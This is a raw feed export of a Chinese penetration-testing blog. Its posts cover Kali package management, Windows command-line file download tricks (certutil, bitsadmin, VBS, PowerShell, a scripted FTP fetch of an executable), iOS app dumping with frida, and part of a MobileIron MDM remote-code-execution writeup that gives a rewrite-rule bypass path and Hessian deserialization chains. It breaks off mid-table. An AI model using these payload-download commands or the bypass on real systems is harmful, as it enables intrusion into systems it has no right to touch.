&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt-cache search pure-ftpd
ftpd - File Transfer Protocol &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; server
mysqmail-pure-ftpd-logger - real-time logging system &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;MySQL - Pure-FTPd traffic-logger
pure-ftpd - Secure and efficient FTP server
pure-ftpd-common - Pure-FTPd FTP server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Common Files&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
pure-ftpd-ldap - Secure and efficient FTP server with LDAP user authentication
pure-ftpd-mysql - Secure and efficient FTP server with MySQL user authentication
pure-ftpd-postgresql - Secure and efficient FTP server with PostgreSQL user authentication
resource-agents - Cluster Resource Agents
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;搜索结果中出现了一个 &lt;em&gt;resource-agents&lt;/em&gt;，是因为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt-cache search&lt;/code&gt; 会搜索整个描述文档。使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt-show&lt;/code&gt; 来确认 &lt;em&gt;resource-agents&lt;/em&gt; 描述中是否包含 “pure-ftpd”：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt show resource-agents
Package: resource-agents
Version: 1:4.2.0-2
...
Description: Cluster Resource Agents
This package contains cluster resource agents &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RAs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; compliant with the Open
Cluster Framework &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OCF&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; specification, used to interface with various services
&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a High Availability environment managed by the Pacemaker resource manager.
&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Agents included:
AoEtarget: Manages ATA-over-Ethernet &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;AoE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; target exports
AudibleAlarm: Emits audible beeps at a configurable interval
...
NodeUtilization: Node Utilization

Pure-FTPd: Manages a Pure-FTPd FTP server instance

Raid1: Manages Linux software RAID &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;MD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; devices on shared storage
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;apt-install&quot;&gt;apt install&lt;/h3&gt;
&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt install&lt;/code&gt; 将包安装到系统：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;pure-ftpd
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following additional packages will be installed:
  openbsd-inetd pure-ftpd-common
The following NEW packages will be installed:
  openbsd-inetd pure-ftpd pure-ftpd-common
0 upgraded, 3 newly installed, 0 to remove and 0 not upgraded.
Need to get 341 kB of archives.
After this operation, 883 kB of additional disk space will be used.
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同样的，使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt remove --purge&lt;/code&gt; 来移除包。&lt;/p&gt;

&lt;h3 id=&quot;apt-remove-purge&quot;&gt;apt remove –purge&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt remove --purge&lt;/code&gt; 完全从系统中移除一个包。需要注意的是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt remove&lt;/code&gt; 也可以移除安装包但是会留下一些文件（通常是用户修改过的配置文件）。&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt remove &lt;span class=&quot;nt&quot;&gt;--purge&lt;/span&gt; pure-ftpd
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following packages were automatically installed and are no longer required:
  openbsd-inetd pure-ftpd-common
Use &lt;span class=&quot;s1&quot;&gt;'sudo apt autoremove'&lt;/span&gt; to remove them.
The following packages will be REMOVED:
  pure-ftpd&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
0 upgraded, 0 newly installed, 1 to remove and 0 not upgraded.
After this operation, 507 kB disk space will be freed.
Do you want to &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] y
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Reading database ... 135806 files and directories currently installed.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Removing pure-ftpd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0.43-3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Processing triggers &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;man-db &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.7.6.1-2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Reading database ... 135793 files and directories currently installed.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Purging configuration files &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;pure-ftpd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0.43-3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Processing triggers &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;systemd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;232-25+deb9u12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;dpkg&quot;&gt;dpkg&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;dpkg&lt;/em&gt; 是用来安装包的工具，无论是否直接通过 APT，它也可以很方便的在离线环境下使用。需要注意的是 &lt;em&gt;dpkg&lt;/em&gt; 不会安装任何依赖环境。使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dpkg&lt;/code&gt; 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-i&lt;/code&gt; 或者 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--install&lt;/code&gt; 选项来安装一个 .deb 包文件，这需要提前获取到 .deb 文件。&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; man-db_2.7.0.2-5_amd64.deb
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Reading database ... 86425 files and directories currently installed.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Preparing to unpack man-db_2.7.0.2-5_amd64.deb ...
Unpacking man-db &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.7.0.2-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; over &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.7.0.2-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Setting up man-db &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.7.0.2-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Updating database of manual pages ...
Processing triggers &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;mime-support &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.58&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="pentest" /><category term="kali" /><category term="linux" /><summary type="html">认识 Kali Linux 文件系统 /bin - 基础命令（ls, cd, cat, etc） /sbin - 系统应用（fdisk, mkfs, sysctl, etc） /etc - 配置文件 /tmp - 临时文件（在引导boot时被删除） /usr/bin - 一般应用（apt, ncat, nmap, etc） /usr/share - 存放应用共享文件和数据的目录</summary></entry><entry><title type="html">WINDOWS CMD 命令行下载文件的几种方法</title><link href="https://blog.securitainment.io/windows/cmd/pentest/2020/10/01/Download-Files-In-Windows-CMD.html" rel="alternate" type="text/html" title="WINDOWS CMD 命令行下载文件的几种方法" /><published>2020-10-01T23:44:00+08:00</published><updated>2020-10-01T23:44:00+08:00</updated><id>https://blog.securitainment.io/windows/cmd/pentest/2020/10/01/Download-Files-In-Windows-CMD</id><content type="html" xml:base="https://blog.securitainment.io/windows/cmd/pentest/2020/10/01/Download-Files-In-Windows-CMD.html">&lt;h2 id=&quot;certutil&quot;&gt;certutil&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;certutil.exe &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; http://7-zip.org/a/7z1604-x64.exe 7zip.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;bitsdmin&quot;&gt;bitsdmin&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bitsadmin /transfer taskname http://7-zip.org/a/7z1604-x64.exe c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\7&lt;/span&gt;zip.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;copy-file&quot;&gt;Copy file&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ bitsadmin /create taskname
$ bitsadmin /addfile taskname c:\temp\7zip.exe c:\7zip.exe
$ bitsadmin /resume taskname
$ bitsadmin /complete taskname
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;vbs&quot;&gt;vbs&lt;/h2&gt;
&lt;p&gt;Windows 10 未测试成功。&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 用echo写入&lt;/span&gt;
On Error Resume Next
Dim iRemote,iLocal
iLocal &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; LCase&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WScript.Arguments&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
iRemote &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; LCase&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WScript.Arguments&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
Set xPost &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; createObject&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Microsoft.XMLHTTP&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
xPost.Open &lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;,iRemote,0
xPost.Send&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
Set sGet &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; createObject&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ADODB.Stream&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
sGet.Mode &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 3
sGet.Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
sGet.Open&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
sGet.Write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;xPost.responseBody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
sGet.SaveToFile iLocal,2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cscript ff.vbs http://7-zip.org/a/7z1604-x64.exe 7zip.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;powershell&quot;&gt;powershell&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;powershell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new-object System.Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.DownloadFile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://7-zip.org/a/7z1604-x64.exe'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'c:\temp\7zip.exe'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ftp&quot;&gt;ftp&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;open 8.8.8.8 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; a.txt &amp;amp; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;get fuck.exe&amp;gt;&amp;gt;a.txt &amp;amp; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;bye&amp;gt;&amp;gt;a.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;:a.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;

  &lt;p&gt;&lt;a href=&quot;https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/&quot;&gt;Bitsadmin.exe&lt;/a&gt;&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;https://www.hackingarticles.in/windows-for-pentester-bitsadmin/&quot;&gt;Windows for Pentester: BITSAdmin&lt;/a&gt;&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/afb1e7b8acaf&quot;&gt;cmd 环境下载文件的几种方法&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name></name></author><category term="windows" /><category term="cmd" /><category term="pentest" /><summary type="html">certutil $ certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe</summary></entry><entry><title type="html">iOS 测试 - 准备测试环境</title><link href="https://blog.securitainment.io/ios/pentest/mobile/2020/09/29/getting-started-with-iOS-testing.html" rel="alternate" type="text/html" title="iOS 测试 - 准备测试环境" /><published>2020-09-29T22:21:00+08:00</published><updated>2020-09-29T22:21:00+08:00</updated><id>https://blog.securitainment.io/ios/pentest/mobile/2020/09/29/getting-started-with-iOS-testing</id><content type="html" xml:base="https://blog.securitainment.io/ios/pentest/mobile/2020/09/29/getting-started-with-iOS-testing.html">&lt;h2 id=&quot;设备越狱&quot;&gt;设备越狱&lt;/h2&gt;
&lt;p&gt;目前稳定的越狱途径是使用 &lt;a href=&quot;https://checkra.in/linux&quot;&gt;checkra1n&lt;/a&gt;，或者使用 &lt;a href=&quot;https://github.com/foxlet/bootra1n&quot;&gt;bootra1n&lt;/a&gt;，一个包含 checkra1n 的 USB Linux 启动盘。&lt;/p&gt;

&lt;h2 id=&quot;安装需要测试的-app&quot;&gt;安装需要测试的 app&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;注册一个不包含个人信息的测试帐号&lt;/li&gt;
  &lt;li&gt;登录 App Store，安装需要测试的 app（或者使用 &lt;a href=&quot;http://www.3u.com/&quot;&gt;3uTools&lt;/a&gt; 安装）&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;dump-ipa-文件&quot;&gt;Dump IPA 文件&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;在已越狱的设备上
    &lt;ul&gt;
      &lt;li&gt;打开 Cydia 商店，安装 &lt;a href=&quot;https://frida.re/docs/ios/&quot;&gt;frida-server&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;在 Kali VM 里安装 frida&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip instal frida-tools
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Kali 安装 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;frida-ios-dump&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;libusbmuxd-tools
ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22 root@localhost    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
git clone https://github.com/AloneMonkey/frida-ios-dump.git
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;frida-ios-dump
pip &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; requirements.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dump.py&lt;/code&gt; ：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 dump.py &amp;lt;target_app_name&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;frida-ps&lt;/code&gt; 来找到正确的 app 名称&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;frida-ps &lt;span class=&quot;nt&quot;&gt;-Uai&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;mobsf-静态扫描&quot;&gt;MobSF 静态扫描&lt;/h2&gt;
&lt;p&gt;参照&lt;a href=&quot;https://linuxhint.com/install_docker_kali_linux/&quot;&gt;手册&lt;/a&gt;安装 docker 版 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MobSF&lt;/code&gt; 并启动：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker pull opensecurity/mobile-security-framework-mobsf
docker run opensecurity/mobile-security-framework-mobsf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;查找该 docker MobSF 监听的端口：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker ps
docker inspect &amp;lt;container_id&amp;gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;IPAddress
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后浏览器访问 &lt;a href=&quot;http://IPAddress:8000/&quot;&gt;http://IPAddress:8000/&lt;/a&gt;，将上一步 dump 的 ipa 文件上传并开始静态分析。&lt;/p&gt;

&lt;blockquote&gt;

  &lt;p&gt;&lt;a href=&quot;https://cornerpirate.com/2020/09/22/getting-started-with-ios-testing/&quot;&gt;Getting started with iOS testing&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name></name></author><category term="ios" /><category term="pentest" /><category term="mobile" /><summary type="html">设备越狱 目前稳定的越狱途径是使用 checkra1n，或者使用 bootra1n，一个包含 checkra1n 的 USB Linux 启动盘。</summary></entry><entry><title type="html">学习：通过寻找 MobileIron MDM 上的远程代码执行漏洞黑进 Facebook</title><link href="https://blog.securitainment.io/pentest/2020/09/29/hack-facebook-by-mdm.html" rel="alternate" type="text/html" title="学习：通过寻找 MobileIron MDM 上的远程代码执行漏洞黑进 Facebook" /><published>2020-09-29T00:53:00+08:00</published><updated>2020-09-29T00:53:00+08:00</updated><id>https://blog.securitainment.io/pentest/2020/09/29/hack-facebook-by-mdm</id><content type="html" xml:base="https://blog.securitainment.io/pentest/2020/09/29/hack-facebook-by-mdm.html">&lt;h2 id=&quot;整理-mobileiron&quot;&gt;整理 MobileIron&lt;/h2&gt;

&lt;p&gt;使用 Google Search 在一个公开网站根目录找到疑似开发商测试用的 RPM 包&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://devco.re/assets/img/blog/20200912/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;下载的版本是 2018 年初版。&lt;/p&gt;

&lt;p&gt;MobileIron 使用 Java 开发，对外开放 443，8443， 9997 端口，各个端口的功能如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;443 為使用者裝置註冊介面&lt;/li&gt;
  &lt;li&gt;8443 為設備管理介面&lt;/li&gt;
  &lt;li&gt;9997 為一個 MobileIron 私有的裝置同步協定 (MI Protocol)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;三个端口都使用 TLS 保证安全性，网页部分则是通过 Apache Reverse Proxy 架构连接到后端，由 Tomcat 部署的网页应用处理，网页应用由 Spring MVC 开发。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://devco.re/assets/img/blog/20200912/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由于使用的技术相对较新，传统漏洞如 SQL Injection 比较难从单一的点来发现，因此转向理解程序逻辑，并配合框架层面的攻击。&lt;/p&gt;

&lt;h2 id=&quot;漏洞总结&quot;&gt;漏洞总结&lt;/h2&gt;

&lt;p&gt;Web Service 使用了 Hessian 格式处理资料，而产生了反序列化漏洞。&lt;/p&gt;

&lt;h2 id=&quot;漏洞详解&quot;&gt;漏洞详解&lt;/h2&gt;

&lt;p&gt;现在已知 MobileIron 在处理 Web Service 的地方存在 Hessian 反序列化漏洞，但是无法直接接触到。&lt;/p&gt;

&lt;p&gt;可触发 Hessian 反序列化的路径分别在：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;一般使用界面：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron/mifs/services/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;管理界面：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron:8443/mifs/services/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;管理界面一般可以轻松接触到 Web Service，但一般用户界面则无法接触到 Web Service，由于一般企业不会将管理页面端口开放在外网，因此只能通过其他方式发现漏洞。&lt;/p&gt;

&lt;p&gt;研究 MobileIron 的阻挡方式，发现是通过 Apache 上使用 Rewrite Rules 来阻挡一般用户访问 Web Service：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;RewriteRule ^/mifs/services/(.*)$ https://%{SERVER_NAME}:8443/mifs/services/$1 [R=307,L]
RewriteRule ^/mifs/services [F]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;由于是在前端做的阻挡，联想到 2015 年的研究，针对 Reverse Proxy 架构的新攻击面 &lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Breaking Parser Logic&lt;/a&gt;，这个技巧最近也被利用在 &lt;a href=&quot;https://support.f5.com/csp/article/K52145254&quot;&gt;CVE-2020-5902&lt;/a&gt;，F5 BIG-IP TMUI 的远程代码执行漏洞上。&lt;/p&gt;

&lt;p&gt;通过 Apache 与 Tomcat 对路径的理解不一致，可以使用以下方式绕过 Rewrite Rule 攻击 Web Service：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://mobileiron/mifs/.;/services/someService
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这样就可以直接接触到有 Hessian 反序列化存在的 Web Service 了。&lt;/p&gt;

&lt;h2 id=&quot;利用漏洞&quot;&gt;利用漏洞&lt;/h2&gt;

&lt;p&gt;针对 Hessian 反序列化，&lt;a href=&quot;https://github.com/mbechler&quot;&gt;Moritz Bechler&lt;/a&gt; 在 &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; 中做了详细的研究报告，从他开源的 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; 源码中，能学习到 Hessian 在反序列化过程中除了通过 HashMap 触发 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;equals()&lt;/code&gt; 以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode()&lt;/code&gt;等，也可以通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XString&lt;/code&gt; 到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toString()&lt;/code&gt;，而目前关于 Hessian 反序列化已存在的利用链有四条：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache XBean&lt;/li&gt;
  &lt;li&gt;Caucho Resin&lt;/li&gt;
  &lt;li&gt;Spring AOP&lt;/li&gt;
  &lt;li&gt;ROME EqualsBean/ToStringBean&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;而根据目标环境，只有 Sprint AOP 这条利用链可以用。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;–&lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Effect&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Apache XBean&lt;/td&gt;
      &lt;td&gt;JNDI 注入&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Caucho Resin&lt;/td&gt;
      &lt;td&gt;JNDI 注入&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;√&lt;/td&gt;
      &lt;td&gt;Spring AOP&lt;/td&gt;
      &lt;td&gt;JNDI 注入&lt;/td&gt;
